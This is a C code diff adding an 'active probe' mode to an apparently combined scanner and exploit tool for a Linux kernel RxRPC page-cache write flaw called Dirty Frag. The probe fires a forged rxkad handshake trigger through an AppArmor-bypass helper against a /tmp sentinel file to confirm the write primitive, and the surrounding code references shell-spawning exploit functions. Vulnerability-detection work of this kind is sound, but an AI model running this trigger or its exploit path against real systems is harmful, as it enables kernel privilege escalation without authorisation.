@@ -204,9 +204,17 @@ df_result_t dirtyfrag_rxrpc_detect(void)
         return DF_PRECOND_FAIL;
     }
 
+    if (dirtyfail_active_probes) {
+        log_step("--active set: firing rxkad handshake-forgery trigger against /tmp sentinel");
+        df_result_t pr = dirtyfrag_rxrpc_active_probe();
+        if (pr == DF_VULNERABLE || pr == DF_OK || pr == DF_PRECOND_FAIL) return pr;
+        log_warn("active probe inconclusive — falling back to precondition verdict");
+    }
+
     log_warn("VULNERABLE — RxRPC variant of Dirty Frag is reachable");
     log_warn("apply mitigation: `dirtyfail --mitigate` (blacklists rxrpc + others)");
     log_warn("or manually: blacklist rxrpc + drop_caches");
+    log_hint("re-run with `--scan --active` for an empirical sentinel-STORE probe");
     return DF_VULNERABLE;
 }
 
@@ -940,11 +948,118 @@ df_result_t dirtyfrag_rxrpc_exploit_inner(void)
     return ok ? DF_EXPLOIT_OK : DF_EXPLOIT_FAIL;
 }
 
+/* ---------------------------------------------------------------- *
+ * Active probe — `--scan --active` path.
+ *
+ * Fires ONE forged-handshake trigger against a /tmp sentinel page
+ * with an arbitrary 8-byte key. We don't try to predict what lands;
+ * any byte change inside the spliced 8-byte window confirms the
+ * kernel ran the STORE.
+ * ---------------------------------------------------------------- */
+
+df_result_t dirtyfrag_rxrpc_active_probe_inner(void)
+{
+    const char *sentinel = getenv("DIRTYFAIL_PROBE_SENTINEL");
+    if (!sentinel || !*sentinel) {
+        log_bad("rxrpc-probe: DIRTYFAIL_PROBE_SENTINEL not set");
+        return DF_TEST_ERROR;
+    }
+
+    int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
+    if (dummy >= 0) close(dummy);
+
+    int t = open(sentinel, O_RDONLY);
+    if (t < 0) {
+        log_bad("rxrpc-probe: open %s: %s", sentinel, strerror(errno));
+        return DF_TEST_ERROR;
+    }
+
+    /* Any 8-byte key works for a structural probe — we're not
+     * recovering plaintext, just confirming the STORE fires. */
+    static const uint8_t probe_key[8] = {
+        0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x23, 0x45, 0x67
+    };
+    bool ok = do_one_trigger(t, 0, probe_key);
+    close(t);
+    return ok ? DF_EXPLOIT_OK : DF_TEST_ERROR;
+}
+
+df_result_t dirtyfrag_rxrpc_active_probe(void)
+{
+    char tmpl[] = "/tmp/dirtyfail-rxrpc-probe.XXXXXX";
+    int sfd = mkstemp(tmpl);
+    if (sfd < 0) { log_bad("rxrpc-probe mkstemp: %s", strerror(errno)); return DF_TEST_ERROR; }
+    unsigned char filler[4096];
+    memset(filler, 'A', sizeof(filler));
+    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
+        close(sfd); unlink(tmpl); return DF_TEST_ERROR;
+    }
+    close(sfd);
+
+    /* Fault page in. */
+    int rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
+    char tmp[4096];
+    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
+        close(rfd); unlink(tmpl); return DF_TEST_ERROR;
+    }
+    close(rfd);
+
+    setenv("DIRTYFAIL_INNER_MODE",     "rxrpc-probe", 1);
+    setenv("DIRTYFAIL_PROBE_SENTINEL", tmpl,          1);
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    unsetenv("DIRTYFAIL_INNER_MODE");
+    unsetenv("DIRTYFAIL_PROBE_SENTINEL");
+
+    if (rc == DF_PRECOND_FAIL) { unlink(tmpl); return DF_PRECOND_FAIL; }
+    if (rc != DF_EXPLOIT_OK)   {
+        log_bad("rxrpc-probe inner failed (exit=%d)", rc);
+        unlink(tmpl); return DF_TEST_ERROR;
+    }
+
+    rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
+    unsigned char after[64];
+    ssize_t got = read(rfd, after, sizeof(after));
+    close(rfd);
+    unlink(tmpl);
+    if (got <= 0) return DF_TEST_ERROR;
+
+    /* Look for any byte that differs from the 'A' filler in the first
+     * 32 bytes (the spliced 8-byte window plus any nearby fallout). */
+    int first_diff = -1;
+    for (int i = 0; i < (int)got && i < 32; i++) {
+        if (after[i] != 'A') { first_diff = i; break; }
+    }
+    if (first_diff >= 0) {
+        log_warn("ACTIVE PROBE rxrpc: STORE landed near offset %d → kernel is VULNERABLE",
+                 first_diff);
+        return DF_VULNERABLE;
+    }
+    log_ok("ACTIVE PROBE rxrpc: page intact — kernel rxrpc path appears patched");
+    return DF_OK;
+}
+
 #else  /* not __linux__ */
 df_result_t dirtyfrag_rxrpc_exploit(bool do_shell)
 {
     (void)do_shell;
     log_bad("dirtyfrag_rxrpc_exploit: Linux-only");
+    return DF_TEST_ERROR;
+}
+df_result_t dirtyfrag_rxrpc_exploit_inner(void)
+{
+    log_bad("dirtyfrag_rxrpc_exploit_inner: Linux-only");
+    return DF_TEST_ERROR;
+}
+df_result_t dirtyfrag_rxrpc_active_probe(void)
+{
+    log_bad("dirtyfrag_rxrpc_active_probe: Linux-only");
+    return DF_TEST_ERROR;
+}
+df_result_t dirtyfrag_rxrpc_active_probe_inner(void)
+{
+    log_bad("dirtyfrag_rxrpc_active_probe_inner: Linux-only");
     return DF_TEST_ERROR;
 }
 #endif
